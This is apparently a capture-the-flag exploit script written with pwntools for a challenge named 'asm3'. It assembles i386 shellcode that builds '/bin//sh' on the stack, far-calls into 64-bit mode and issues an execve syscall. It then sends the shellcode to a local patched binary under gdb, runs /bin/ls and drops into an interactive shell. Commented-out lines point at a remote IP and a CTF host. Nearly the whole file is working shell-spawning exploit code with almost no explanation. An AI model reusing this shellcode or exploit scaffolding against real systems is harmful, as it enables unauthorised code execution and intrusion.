from pwn import *

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
# context.log_level = 'error'

code_base = 0x565f5000
bss_base = 0x565f7000

int80_offset = 0xcc0
read_offset = 0x770
rop_chain_offset = 0x300

int80_addr = code_base + int80_offset
read_addr = code_base + read_offset
rop_chain_addr = bss_base + rop_chain_offset

script = "b *main+519"

# p = remote("13.124.134.94", 8888)

DEBUG = True

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

def s(msg, enter = True):
  msg = msg + "\n" if enter else msg
  p.send(msg)
  if DEBUG:
    log.info("Sent: " + msg)

sc = pwnlib.shellcraft.i386
context.arch = 'i386'

offset = 0xfffecbe0


shell = asm('mov al, 0xcb')
shell += asm('mov esp, gs:[ebx]')
shell += asm('push ebx')
shell += asm('push 0x68732f2f')
shell += asm('push 0x6e69622f')
shell += asm('mov edi, esp')
shell += asm('mov al, 59')

shell += '\x6a\x33'
shell += '\xe8\xe6\xff\xff\xff'
shell += '\x0f\x05' # syscall

"""
code = "mov esp, gs:[ebx]\n"
code += 'push ebx\n'
code += 'push 0x68732f2f\n'
code += 'push 0x6e69622f\n'
code += 'mov ebx, esp\n'
code += 'push 0x33\n'
code += 'call 0xffffffff'
# code += 'add [esp], 0x5\n'
# code += 'retf'
# code += 'mov eax, cr3\n'
"""

"""
code = "mov esi, gs:[ebx]\n"
code += "mov esp, esi\n"
code += 'push ebx\n'
code += 'push 0x68732f2f\n'
code += 'push 0x6e69622f\n'
code += 'mov ebx, esp\n'
code += 'mov al, 0x0b\n'
code += 'and si, 0xf003\n'
code += "add si, 0x1ed0\n"
code += 'mov edi, DWORD PTR [esi]\n'
code += 'push edi\n'
code += 'ret\n'
"""

"""
code = "mov ecx, 0xc0c08080\n"
code += "and ecx, 0xff0f0fff\n"
"""

# shell = asm(code)

print "length: %d" % len(shell)

shell = shell.ljust(0x1e, "\x90")

print hex(offset)
print shell.encode('hex')


# p = remote('asm3.eatpwnnosleep.com', 1234)

while True:
  #p = remote('localhost', 4924)
  p = process("./asm3_patch")
  gdb.attach(p, gdbscript = script)

  r("shellcode:")
  s(shell, False)

  r("see\n")

  try:
    s("/bin/ls")
    response = r("\n")

    print response

    p.interactive()
    p.close()

  except:
    p.close()
